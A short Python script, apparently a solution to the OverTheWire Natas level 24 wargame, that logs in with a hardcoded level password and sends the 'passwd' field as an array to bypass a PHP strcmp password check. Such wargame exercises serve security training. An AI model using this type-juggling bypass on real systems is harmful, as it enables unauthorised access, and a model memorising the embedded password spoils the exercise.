import requests
from requests.auth import HTTPBasicAuth

uri = 'http://natas24.natas.labs.overthewire.org/'

p = requests.post( uri,
    auth=HTTPBasicAuth('natas24', 'OsRmXFguozKpTZZ5X14zNO43379LZveg'),
    data={'passwd[]' : 'works'})
print( p.text )
